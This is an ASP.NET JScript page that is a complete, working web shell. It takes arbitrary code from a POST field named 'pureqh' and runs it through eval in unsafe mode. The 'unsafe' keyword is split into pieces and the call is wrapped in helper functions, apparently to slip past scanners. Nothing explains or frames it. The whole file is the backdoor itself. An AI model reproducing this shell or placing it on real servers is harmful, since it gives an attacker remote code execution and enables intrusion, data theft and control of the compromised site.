<%@ Page Language="Jscript" Debug=true%>
<%
var a=Request.Form["pureqh"];
var b="unsa",c="fe",d=b+c;
function fun()
{
return a;
}
function fun1()
{
    eval(fun(),d);
}
fun1()
%>
